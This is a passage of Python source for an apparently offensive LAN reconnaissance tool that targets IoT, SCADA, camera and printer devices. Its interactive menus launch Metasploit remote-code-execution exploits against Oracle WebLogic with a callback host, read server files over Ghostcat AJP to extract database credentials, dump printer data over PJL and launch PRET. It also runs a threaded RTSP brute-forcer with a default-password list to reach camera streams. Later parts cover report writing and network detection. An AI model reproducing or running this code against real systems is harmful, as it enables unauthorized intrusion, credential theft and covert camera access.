                        _run_cmd(
                            ['msfconsole', '-q', '-x',
                             f'use auxiliary/scanner/postgres/postgres_login; '
                             f'set RHOSTS {ip}; run; exit'],
                            'MSF postgres_login', ip, timeout=120
                        )

            # ── Ghostcat / Tomcat AJP ─────────────────────────────────────────────
            elif section == 'ghostcat':
                print(f"\n{RESET}{YELLOW}{'─'*60}")
                print(f"  GHOSTCAT — Tomcat AJP  ({len(ghostcat_hosts)} host(s))  CVE-2020-1938")
                print(f"{'─'*60}{RESET}")
                for d in ghostcat_hosts:
                    gc = d['probes']['ghostcat']
                    fr = f"  {RED}[FILE-READ]{RESET}" if gc.get('file_read') else ''
                    print(f"  {d['ip']:<16} {d['vendor'][:24]:<24}  port {gc.get('port',8009)}{fr}")

                choice = pick(
                    "Ghostcat action",
                    [
                        ('1', 'Show AJP response — confirm connector is open'),
                        ('2', 'Read /WEB-INF/web.xml — extract DB creds, servlet config'),
                        ('3', 'Metasploit ghostcat — CVE-2020-1938 file read'),
                        ('4', 'nmap ajp-headers + ajp-request scripts'),
                    ]
                )

                if choice == '1':
                    for d in ghostcat_hosts:
                        ip = d['ip']
                        gc = d['probes']['ghostcat']
                        print(f"\n  {BOLD}[{ip}]{RESET}")
                        print(f"    AJP port  : {gc.get('port', 8009)}")
                        print(f"    File read : {GREEN+'confirmed'+RESET if gc.get('file_read') else 'likely (connector open)'}")
                        if gc.get('banner'):
                            print(f"    Banner    : {gc['banner']}")

                elif choice == '2':
                    for d in ghostcat_hosts:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET}  — reading /WEB-INF/web.xml via AJP")
                        try:
                            target_file = input(f"  File path [/WEB-INF/web.xml]: ").strip() or '/WEB-INF/web.xml'
                        except (EOFError, KeyboardInterrupt):
                            target_file = '/WEB-INF/web.xml'
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '8009',
                             '--script', 'ajp-request',
                             '--script-args', f'ajp-request.path={target_file}',
                             ip],
                            'nmap ajp-request', ip, timeout=60
                        )

                elif choice == '3':
                    for d in ghostcat_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['msfconsole', '-q', '-x',
                             f'use auxiliary/scanner/http/tomcat_mgr_login; '
                             f'set RHOSTS {ip}; set RPORT 8009; run; exit'],
                            'MSF Ghostcat', ip, timeout=120
                        )

                elif choice == '4':
                    for d in ghostcat_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '8009,8080,8443',
                             '--script', 'ajp-headers,ajp-request',
                             ip],
                            'nmap AJP scripts', ip, timeout=120
                        )

            # ── WebLogic ──────────────────────────────────────────────────────────
            elif section == 'weblogic':
                print(f"\n{RESET}{RED}{'─'*60}")
                print(f"  ORACLE WEBLOGIC  ({len(weblogic_hosts)} host(s))")
                print(f"  CVE-2019-2725 (T3 deserialization, pre-auth RCE, CVSS 9.8)")
                print(f"{'─'*60}{RESET}")
                for d in weblogic_hosts:
                    wl  = d['probes']['weblogic']
                    ver = wl.get('version','?')
                    con = f"  {YELLOW}[console exposed]{RESET}" if wl.get('console') else ''
                    print(f"  {d['ip']:<16} {d['vendor'][:20]:<20}  WebLogic {ver}{con}")

                choice = pick(
                    "WebLogic action",
                    [
                        ('1', 'Show T3 handshake + version + console exposure'),
                        ('2', 'Metasploit CVE-2019-2725 — pre-auth RCE (T3 deserialization)'),
                        ('3', 'Metasploit CVE-2015-4852 — Commons Collections gadget chain RCE'),
                        ('4', 'nmap weblogic-t3-info + http-title scripts'),
                    ]
                )

                if choice == '1':
                    for d in weblogic_hosts:
                        ip = d['ip']
                        wl = d['probes']['weblogic']
                        print(f"\n  {BOLD}[{ip}]{RESET}  {d.get('vendor','')}")
                        print(f"    Version   : {wl.get('version','unknown')}")
                        print(f"    Console   : {RED+'EXPOSED'+RESET if wl.get('console') else 'not confirmed'}")
                        print(f"    Port      : {wl.get('port',7001)}")
                        print(f"    CVEs      : CVE-2019-2725 / CVE-2015-4852 / CVE-2020-14882")

                elif choice == '2':
                    for d in weblogic_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['msfconsole', '-q', '-x',
                             f'use exploit/multi/misc/weblogic_deserialize_asyncresponseservice; '
                             f'set RHOSTS {ip}; set LHOST {self.lhost}; run; exit'],
                            'MSF WebLogic CVE-2019-2725', ip, timeout=120
                        )

                elif choice == '3':
                    for d in weblogic_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['msfconsole', '-q', '-x',
                             f'use exploit/multi/misc/weblogic_deserialize_badattr_extcomp; '
                             f'set RHOSTS {ip}; set LHOST {self.lhost}; run; exit'],
                            'MSF WebLogic CVE-2015-4852', ip, timeout=120
                        )

                elif choice == '4':
                    for d in weblogic_hosts:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '7001,7002',
                             '--script', 'http-title,http-auth-finder',
                             ip],
                            'nmap WebLogic scripts', ip, timeout=120
                        )

            # ── Printers ──────────────────────────────────────────────────────────
            elif section == 'printers':
                print(f"\n{RESET}{YELLOW}{'─'*60}")
                print(f"  PRINTERS  ({len(printers)} device(s))")
                print(f"{'─'*60}{RESET}")
                for d in printers:
                    pjl = d['probes'].get('pjl', {})
                    model = (pjl.get('model', '') if isinstance(pjl, dict) else '') or d['vendor'][:20]
                    pts = sorted(p for p in d['open_tcp'] if p in (9100, 631, 80, 443, 515))
                    print(f"  {d['ip']:<16}  {model[:30]:<30}  ports: {pts}")

                choice = pick(
                    "Printer action",
                    [
                        ('1', 'PJL info dump — id/config/status/variables/memory (raw)'),
                        ('2', 'IPP probe — get-printer-attributes on port 631'),
                        ('3', 'Launch PRET — PJL mode (requires pret.py)'),
                        ('4', 'Launch PRET — PS mode (requires pret.py)'),
                        ('5', 'nmap — pjl-ready-message + printer-info scripts'),
                    ]
                )

                if choice == '1':
                    for d in printers:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET}  PJL info dump")
                        try:
                            s = socket.create_connection((ip, 9100), timeout=4)
                            s.sendall(
                                b'\x1b%-12345X'
                                b'@PJL INFO ID\r\n'
                                b'@PJL INFO CONFIG\r\n'
                                b'@PJL INFO STATUS\r\n'
                                b'@PJL INFO VARIABLES\r\n'
                                b'@PJL INFO MEMORY\r\n'
                                b'@PJL INFO FILESYS\r\n'
                                b'\x1b%-12345X'
                            )
                            s.settimeout(3)
                            out = b''
                            try:
                                while len(out) < 8192:
                                    chunk = s.recv(1024)
                                    if not chunk:
                                        break
                                    out += chunk
                            except Exception:
                                pass
                            s.close()
                            text = out.decode('utf-8', errors='replace')
                            print(text[:4000])
                            with open(self.output_file, 'a') as fh:
                                fh.write(f"\nPRINTER-PJL  {ip}\n{text}\n")
                        except Exception as e:
                            print(f"  {RED}[!] {e}{RESET}")

                elif choice == '2':
                    for d in printers:
                        ip = d['ip']
                        print(f"\n  {BOLD}[{ip}]{RESET}  IPP probe :631")
                        try:
                            out = subprocess.run(
                                ['curl', '-s', '--max-time', '5', f'http://{ip}:631/printers'],
                                capture_output=True, timeout=8
                            ).stdout.decode('utf-8', errors='replace')
                            if out.strip():
                                print(out[:1500])
                                with open(self.output_file, 'a') as fh:
                                    fh.write(f"\nPRINTER-IPP  {ip}:631\n{out}\n")
                            else:
                                print(f"  {YELLOW}[~] No response on :631/printers{RESET}")
                        except Exception as e:
                            print(f"  {RED}[!] {e}{RESET}")

                elif choice in ('3', '4'):
                    mode = 'pjl' if choice == '3' else 'ps'
                    pret = shutil.which('pret.py') or shutil.which('pret')
                    if not pret:
                        for _cand in ('/opt/pret/pret.py', '/usr/local/bin/pret.py', '/root/pret/pret.py'):
                            if os.path.isfile(_cand):
                                pret = _cand
                                break
                    if not pret:
                        print(f"\n  {RED}[!] pret.py not found.{RESET}")
                        print(f"  {YELLOW}    git clone https://github.com/rub-nds/pret /opt/pret{RESET}")
                    else:
                        py2 = shutil.which('python2') or shutil.which('python2.7')
                        py  = py2 if py2 else 'python3'
                        for d in printers:
                            ip = d['ip']
                            print(f"\n  {BOLD}[{ip}]{RESET}  PRET {mode.upper()} — interactive")
                            try:
                                subprocess.run([py, pret, ip, mode], timeout=300)
                            except KeyboardInterrupt:
                                pass
                            except Exception as e:
                                print(f"  {RED}[!] {e}{RESET}")

                elif choice == '5':
                    for d in printers:
                        ip = d['ip']
                        _run_cmd(
                            ['nmap', '-sT', '--unprivileged', '-p', '9100',
                             '--script', 'pjl-ready-message,printer-info',
                             ip],
                            'nmap printer scripts', ip, timeout=60
                        )

        # Final terminal cleanup
        sys.stdout.write('\033[0m')
        sys.stdout.flush()
        try:
            with open('/dev/tty', 'w') as _tty:
                _tty.write('\033[0m')
        except Exception:
            pass
        try:
            subprocess.call(['stty', 'sane'], stderr=subprocess.DEVNULL)
        except Exception:
            pass

    # ── Report writer ─────────────────────────────────────────────────────────

    def _write_report(self, results, start, elapsed):
        W = 76

        def HR(c='='): return c * W
        def row(label, value, w=22):
            return f"  {label:<{w}}: {value}"

        total        = len(results)
        count_scada   = sum(1 for r in results if r['device_type'] == 'SCADA/ICS')
        count_cam     = sum(1 for r in results if r['device_type'] == 'Camera/CCTV')
        count_iot     = sum(1 for r in results if r['device_type'] == 'IoT')
        count_printer = sum(1 for r in results if r['device_type'] == 'Printer')
        count_other   = total - count_scada - count_cam - count_iot - count_printer

        all_probes = set()
        for r in results:
            all_probes.update(r['probes'].keys())

        scada_found = all_probes & {'modbus','iec104','s7','enip','dnp3','bacnet','opc_ua'}
        iot_found   = all_probes & {'mqtt','mqtt_ssl','coap','upnp'}
        cam_found   = all_probes & {'rtsp','rtsp_alt'}

        lines = [
            HR(),
            "  LAN RECON REPORT — IoT / SCADA / Camera Discovery",
            HR(),
            row("Date / Time",    start.strftime('%Y-%m-%d %H:%M:%S')),
            row("Target Network", self.network),
            row("Scan Duration",  f"{elapsed:.1f} seconds"),
            row("Report File",    self.output_file),
            HR(),
            "",
            HR('-'),
            "  SCAN SUMMARY",
            HR('-'),
            f"  Total live hosts      : {total}",
            f"  SCADA / ICS           : {count_scada}",
            f"  IP Cameras / CCTV     : {count_cam}",
            f"  IoT devices           : {count_iot}",
            f"  Printers              : {count_printer}",
            f"  Unknown / Other       : {count_other}",
            "",
        ]

        if scada_found:
            lines.append(f"  SCADA protocols found : {', '.join(sorted(p.upper() for p in scada_found))}")
        if cam_found:
            lines.append(f"  Camera protocols found: {', '.join(sorted(p.upper() for p in cam_found))}")
        if iot_found:
            lines.append(f"  IoT protocols found   : {', '.join(sorted(p.upper() for p in iot_found))}")

        # Quick reference table
        lines += [
            "",
            HR('-'),
            "  QUICK REFERENCE",
            HR('-'),
            f"  {'IP':<16} {'MAC':<20} {'Type':<16} {'Vendor'}",
            f"  {'-'*16} {'-'*20} {'-'*16} {'-'*28}",
        ]
        for r in results:
            lines.append(
                f"  {r['ip']:<16} {r['mac']:<20} {r['device_type']:<16} {r['vendor'][:28]}"
            )

        # Per-device detail sections
        lines += ["", HR(), "  DEVICE DETAILS", HR()]

        for idx, r in enumerate(results, 1):
            dt  = r['device_type']
            acc = r['os_acc']
            lines += [
                "",
                HR('-'),
                f"  DEVICE {idx:02d}  [{dt}]",
                HR('-'),
                row("IP Address",    r['ip']),
                row("MAC Address",   r['mac']),
                row("Vendor (OUI)",  r['vendor']),
                row("Hostname",      r['hostname']),
                row("Device Type",   dt),
                row("OS Fingerprint",f"{r['os']} (accuracy: {acc}%)"),
            ]

            # TCP ports
            if r['open_tcp']:
                lines += ["", f"  Open TCP Ports ({len(r['open_tcp'])}) :"]
                for p in r['open_tcp']:
                    svc  = r['tcp_svcs'].get(p, {})
                    name = PORT_LABEL.get(p, svc.get('service', ''))
                    prod = ' '.join(filter(None, [svc.get('product',''), svc.get('version','')]))
                    label = f"{name}  {prod}".strip() or '-'
                    lines.append(f"    {p:<7}/tcp  {label}")
            else:
                lines.append(row("Open TCP Ports", "none"))

            # UDP ports
            if r['open_udp']:
                lines += ["", f"  Open UDP Ports ({len(r['open_udp'])}) :"]
                for p in r['open_udp']:
                    svc   = r['udp_svcs'].get(p, {})
                    name  = PORT_LABEL.get(p, svc.get('service', ''))
                    state = svc.get('state', 'open')
                    tag   = ' [open|filtered]' if state == 'open|filtered' else ''
                    lines.append(f"    {p:<7}/udp  {name or '-'}{tag}")

            # Protocol probe results
            if r['probes']:
                lines += ["", "  Protocol Probe Results :"]
                for key, val in r['probes'].items():
                    if isinstance(val, str):
                        lines.append(f"    [{key.upper()}] {val}")
                    elif isinstance(val, dict):
                        proto = val.get('protocol', key.upper())
                        lines.append(f"    [{proto}]")
                        for k, v in val.items():
                            if k in ('protocol', 'port'):
                                continue
                            if isinstance(v, list):
                                lines.append(f"      {k}: {', '.join(str(i) for i in v)}")
                            else:
                                lines.append(f"      {k}: {v}")

            # Screenshots
            shots = r.get('screenshots', {})
            if shots:
                lines += ["", "  Screenshots :"]
                for port, fpath in sorted(shots.items()):
                    if fpath:
                        lines.append(f"    port {port:<6} -> {fpath}")
                    else:
                        lines.append(f"    port {port:<6} -> [capture failed]")

        lines += [
            "",
            HR(),
            f"  END OF REPORT — LAN Recon v{VERSION}",
            HR(),
            "",
        ]

        text = '\n'.join(lines)
        with open(self.output_file, 'w', encoding='utf-8') as f:
            f.write(text)

        # Console summary
        print(f"\n{'='*W}")
        print("  SUMMARY")
        print(f"{'='*W}")
        print(f"  Total hosts   : {total}")
        print(f"  SCADA/ICS     : {count_scada}")
        print(f"  Cameras       : {count_cam}")
        print(f"  IoT           : {count_iot}")
        print(f"  Other         : {count_other}")
        if scada_found:
            print(f"  SCADA protos  : {', '.join(sorted(p.upper() for p in scada_found))}")
        if cam_found:
            print(f"  Cam protos    : {', '.join(sorted(p.upper() for p in cam_found))}")
        if iot_found:
            print(f"  IoT protos    : {', '.join(sorted(p.upper() for p in iot_found))}")
        print(f"{'='*W}")


# ─────────────────────────────────────────────────────────────────────────────
# RTSP BRUTE-FORCE
# ─────────────────────────────────────────────────────────────────────────────

# RTSP ports to try on each camera (in priority order)
RTSP_PORTS = [554, 8554, 37778]

# Credential list: (username, password)
RTSP_CREDS = [
    ('',      ''),
    ('admin', ''),
    ('admin', 'admin'),
    ('admin', '12345'),
    ('admin', '123456'),
    ('admin', 'admin123'),
    ('admin', '1234'),
    ('admin', 'password'),
    ('admin', '888888'),
    ('admin', '666666'),
    ('root',  ''),
    ('root',  'root'),
    ('root',  'admin'),
    ('root',  '12345'),
    ('user',  'user'),
    ('guest', 'guest'),
    ('ubnt',  'ubnt'),
]


def _rtsp_describe(ip: str, port: int, user: str, passwd: str,
                   path: str, timeout: int = 4) -> bool:
    """Send RTSP DESCRIBE with credentials. Returns True if server replies 200 OK."""
    if user or passwd:
        url = f'rtsp://{user}:{passwd}@{ip}:{port}{path}'
    else:
        url = f'rtsp://{ip}:{port}{path}'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        req = (
            f'DESCRIBE {url} RTSP/1.0\r\n'
            f'CSeq: 2\r\n'
            f'User-Agent: fsec-probe\r\n'
            f'Accept: application/sdp\r\n'
            f'\r\n'
        ).encode()
        s.sendall(req)
        resp = s.recv(512).decode('utf-8', errors='replace')
        s.close()
        return resp.startswith('RTSP/') and ' 200 ' in resp.split('\r\n')[0]
    except Exception:
        return False


def rtsp_bruteforce(cameras: list, routes_file: str = None,
                    timeout: int = 4, workers: int = 10) -> list:
    """
    Try common credentials × path combinations on every RTSP port of each camera.
    Returns list of dicts: {ip, port, user, password, path, url}
    """
    GREEN  = '\033[1;32m'
    YELLOW = '\033[1;33m'
    RESET  = '\033[0m'

    # Load paths from routes.txt
    paths = ['/']
    if routes_file and os.path.isfile(routes_file):
        try:
            with open(routes_file, 'r', errors='ignore') as f:
                for line in f:
                    p = line.strip()
                    if p and p not in paths:
                        paths.append(p)
            print(f"[*] Loaded {len(paths)} RTSP paths from {routes_file}")
        except Exception:
            pass

    found = []

    for cam in cameras:
        ip         = cam['ip']
        vendor     = cam.get('vendor', 'Unknown')
        cam_ports  = [p for p in cam.get('open_tcp', []) if p in set(RTSP_PORTS)]
        if not cam_ports:
            cam_ports = [554]  # try default even if not confirmed open

        print(f"\n{YELLOW}[*] RTSP brute-force → {ip} ({vendor})  ports: {cam_ports}{RESET}")

        tasks = [
            (ip, port, user, passwd, path)
            for port   in cam_ports
            for user, passwd in RTSP_CREDS
            for path   in paths
        ]

        def _try(t):
            ip_, port_, user_, passwd_, path_ = t
            ok = _rtsp_describe(ip_, port_, user_, passwd_, path_, timeout)
            if ok:
                u = f'rtsp://{user_}:{passwd_}@{ip_}:{port_}{path_}' if (user_ or passwd_) \
                    else f'rtsp://{ip_}:{port_}{path_}'
                return {'ip': ip_, 'port': port_, 'user': user_,
                        'password': passwd_, 'path': path_, 'url': u}
            return None

        with ThreadPoolExecutor(max_workers=workers) as pool:
            for result in as_completed(pool.submit(_try, t) for t in tasks):
                r = result.result()
                if r:
                    print(f"  {GREEN}[+] OPEN STREAM : {r['url']}{RESET}")
                    found.append(r)

    return found


# ─────────────────────────────────────────────────────────────────────────────
# INTERFACE / NETWORK DETECTION
# ─────────────────────────────────────────────────────────────────────────────

def list_network_interfaces() -> list:
    """
    Return list of (iface, network_cidr, host_ip) for all non-loopback IPv4 interfaces.
    Uses `ip -o -4 addr show` (iproute2).
    """
    ifaces = []
    try:
        out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show'], text=True)
        for line in out.splitlines():
            # "2: wlan0    inet 192.168.1.100/24 brd ..."
            m = re.match(r'\d+:\s+(\S+)\s+inet\s+(\d+\.\d+\.\d+\.\d+/\d+)', line)
            if m:
                iface = m.group(1)
                if iface == 'lo':
                    continue
                addr_cidr = m.group(2)
                host_ip   = addr_cidr.split('/')[0]
                network   = str(ipaddress.ip_network(addr_cidr, strict=False))
                ifaces.append((iface, network, host_ip))
    except Exception:
        pass
    return ifaces


def get_default_network() -> str:
    """
    Detect the default gateway and return its network in CIDR notation.
    e.g. gateway 192.168.1.1 with mask 255.255.255.0  ->  192.168.1.0/24
    Falls back to parsing /proc/net/route if netifaces is unavailable.
    """
    # ── Method 1: netifaces (most reliable) ──────────────────────────────────
    try:
        import netifaces
        gws = netifaces.gateways()
        default = gws.get('default', {})
        if netifaces.AF_INET in default:
            gw_ip, iface = default[netifaces.AF_INET][0], default[netifaces.AF_INET][1]
            addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
            if addrs:
                ip   = addrs[0]['addr']
                mask = addrs[0]['netmask']
                net  = ipaddress.ip_network(f'{ip}/{mask}', strict=False)
                print(f"[*] Auto-detected network: {net}  (iface: {iface}, gw: {gw_ip})")
                return str(net)
    except ImportError:
        pass
    except Exception as e:
        print(f"[~] netifaces method failed: {e}")

    # ── Method 2: parse /proc/net/route (Linux) ───────────────────────────────
    try:
        with open('/proc/net/route') as f:
            for line in f.readlines()[1:]:
                parts = line.strip().split()
                if len(parts) < 8:
                    continue
                iface   = parts[0]
                dest    = int(parts[1], 16)
                gateway = int(parts[2], 16)
                mask    = int(parts[7], 16)
                # Default route: dest == 0 and gateway != 0
                if dest == 0 and gateway != 0:
                    # Get local IP on this interface to derive the network
                    gw_ip = socket.inet_ntoa(struct.pack('<I', gateway))
                    # Use gw_ip + mask to get network
                    mask_ip = socket.inet_ntoa(struct.pack('<I', mask))
                    net = ipaddress.ip_network(f'{gw_ip}/{mask_ip}', strict=False)
                    print(f"[*] Auto-detected network: {net}  (iface: {iface}, gw: {gw_ip})")
                    return str(net)
    except Exception as e:
        print(f"[~] /proc/net/route method failed: {e}")

    # ── Method 3: ip route command ────────────────────────────────────────────
    try:
        import subprocess
        out = subprocess.check_output(['ip', 'route'], text=True)
        for line in out.splitlines():
            # "default via 192.168.1.1 dev eth0"
            m = re.match(r'default via (\S+) dev (\S+)', line)
            if m:
                gw_ip = m.group(1)
                iface = m.group(2)
                # Get subnet from the interface route lines
                for rline in out.splitlines():
                    # "192.168.1.0/24 dev eth0 ..."
                    rm = re.match(r'(\d+\.\d+\.\d+\.\d+/\d+) dev ' + re.escape(iface), rline)
                    if rm:
                        net = ipaddress.ip_network(rm.group(1), strict=False)
                        print(f"[*] Auto-detected network: {net}  (iface: {iface}, gw: {gw_ip})")
                        return str(net)
                # Fallback: assume /24 from gateway
                net = ipaddress.ip_network(f'{gw_ip}/24', strict=False)
                print(f"[*] Auto-detected network: {net}  (iface: {iface}, gw: {gw_ip}) [assumed /24]")
                return str(net)
    except Exception as e:
        print(f"[~] ip route method failed: {e}")

    print("[!] Could not auto-detect default network. Please provide it as an argument.")
    sys.exit(1)


def _input_tty(prompt: str) -> str:
    """
    Read a line from /dev/tty with the prompt written directly to /dev/tty.

    Writing the prompt to sys.stdout (the tee pipe) causes a race: tee may
    not flush the text to the terminal before the user starts typing, making
    typed characters appear invisible.  Writing directly to /dev/tty bypasses
    the pipe entirely so the prompt is always visible before we block on read.

    Also re-enables terminal echo+canonical mode before each read so that tools
    run via _run_cmd (nmap, msfconsole, crackmapexec) cannot leave the terminal
    in a broken no-echo state between prompts.
    """
    # Re-enable echo + canonical (line-editing) mode via termios.
    # If termios is unavailable, fall back to 'stty echo sane'.
    try:
        import termios
        _tty_fd = os.open('/dev/tty', os.O_RDWR | os.O_NOCTTY)
        try:
            attr = termios.tcgetattr(_tty_fd)
            attr[3] |= termios.ECHO | termios.ICANON   # lflag: re-enable echo + line input
            termios.tcsetattr(_tty_fd, termios.TCSANOW, attr)
        finally:
            os.close(_tty_fd)
    except Exception:
        try:
            subprocess.call(['stty', 'echo', 'icanon'], stderr=subprocess.DEVNULL)
        except Exception:
            pass

    # Write prompt directly to /dev/tty — bypasses the tee pipe.
    try:
        with open('/dev/tty', 'w') as _tty_out:
            _tty_out.write(prompt)
            _tty_out.flush()
    except OSError:
        sys.stdout.write(prompt)
        sys.stdout.flush()

    # Read the user's line from /dev/tty.
    try:
        with open('/dev/tty', 'r') as _tty:
            line = _tty.readline()
    except OSError:
        line = sys.stdin.readline()
    if not line:
        raise EOFError
    return line.rstrip('\n')


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    # Always restore terminal ANSI state when Python exits (normal or crash/Ctrl+C)
    def _reset_term():
        # Write directly to /dev/tty so the reset reaches the terminal even
        # when stdout is piped through tee (bypasses the pipe entirely)
        try:
            with open('/dev/tty', 'w') as _tty:
                _tty.write('\033[0m')
        except Exception:
            try:
                sys.stderr.write('\033[0m')
                sys.stderr.flush()
            except Exception:
                pass
        # Restore terminal input modes (echo, canonical) in case readline
        # left them dirty after a Ctrl+C inside input()
        try:
            subprocess.call(['stty', 'sane'], stderr=subprocess.DEVNULL)
        except Exception:
            pass
    atexit.register(_reset_term)
    # Prevent broken-pipe silent termination when stdout is piped through tee
    try:
        signal.signal(signal.SIGPIPE, signal.SIG_DFL)
    except AttributeError:
        pass  # SIGPIPE not available on Windows

    parser = argparse.ArgumentParser(
        description='LAN Recon — Ultimate IoT / SCADA / Camera Device Discovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 recon_iot_scada.py                          # auto-detect default gateway network
  sudo python3 recon_iot_scada.py 192.168.1.0/24
  sudo python3 recon_iot_scada.py 10.0.0.0/16 --workers 15
  sudo python3 recon_iot_scada.py 172.16.1.0/24 --output myreport.txt
  sudo python3 recon_iot_scada.py 192.168.1.0/24 --oui-file /path/to/oui.txt
        """
    )
    parser.add_argument('network',    nargs='?', default=None,
                        help='Target network CIDR (e.g. 192.168.1.0/24). '
                             'Omit to auto-detect from default gateway.')
    parser.add_argument('--output',   help='Output .txt file (default: auto-named in script dir)', default=None)
    parser.add_argument('--workers',       help='Parallel device scans (default: 20)', type=int, default=20)
    parser.add_argument('--probe-workers', help='Parallel probes per device (default: 5)', type=int, default=5)
    parser.add_argument('--oui-file',       help='Local OUI database file', default=None)
    parser.add_argument('--no-screenshots', help='Disable web screenshots', action='store_true')
    parser.add_argument('-nU', '--no-udp',  help='Skip UDP port scanning (faster, TCP-only)', action='store_true')
    args = parser.parse_args()

    # Auto-detect network if not provided
    if args.network is None:
        ifaces = list_network_interfaces()
        if len(ifaces) == 1:
            iface, net, host_ip = ifaces[0]
            print(f"[*] Auto-detected: {net}  (iface: {iface}, host: {host_ip})")
            args.network = net
        elif len(ifaces) > 1:
            print("[?] Multiple network interfaces detected:")
            for i, (iface, net, host_ip) in enumerate(ifaces, 1):
                print(f"    {i}) {iface:<12} {host_ip:<16} → {net}")
            print(f"    0) Enter manually")
            while True:
                try:
                    choice = _input_tty("Select interface [1]: ").strip()
                except (EOFError, KeyboardInterrupt):
                    choice = '1'
                if choice == '0':
                    cidr = _input_tty("Enter network CIDR: ").strip()
                    try:
                        args.network = str(ipaddress.ip_network(cidr, strict=False))
                    except ValueError:
                        print(f"[!] Invalid CIDR — using first interface")
                        args.network = ifaces[0][1]
                    break
                try:
                    idx = int(choice or '1') - 1
                    if 0 <= idx < len(ifaces):
                        args.network = ifaces[idx][1]
                        break
                except ValueError:
                    pass
                print("  Invalid — enter a number from 0 to", len(ifaces))
        else:
            args.network = get_default_network()
    else:
        try:
            ipaddress.ip_network(args.network, strict=False)
        except ValueError as e:
            print(f"[!] Invalid network: {e}")
            sys.exit(1)

    # uid=0 is not enough on Android — netlink sockets need extra capabilities.
    # Probe AF_NETLINK directly; if it fails we're effectively rootless.
    def _can_use_raw_sockets():
        if os.geteuid() != 0:
            return False
        try:
            import socket as _s
            # Must test bind() — on Android uid=0 can create but not bind netlink
            sock = _s.socket(_s.AF_NETLINK, _s.SOCK_RAW, 0)
            sock.bind((0, 0))
            sock.close()
            return True
        except (PermissionError, OSError):
            return False

    ROOTLESS = not _can_use_raw_sockets()
    if ROOTLESS:
        print("[~] Running without raw-socket privileges — ARP scan and SYN scan disabled.")
        print("    TCP connect scan (-sT) will be used instead. MAC addresses unavailable.")
        print("    (On Android rootless Kali this is normal even for uid=0.)")

    NetworkScanner(
        network=args.network,
        output_file=args.output,
        max_workers=args.workers,
        probe_workers=args.probe_workers,
        oui_file=args.oui_file,
        screenshots=not args.no_screenshots,
        no_udp=args.no_udp,
        rootless=ROOTLESS,
    ).run()


if __name__ == '__main__':
    main()
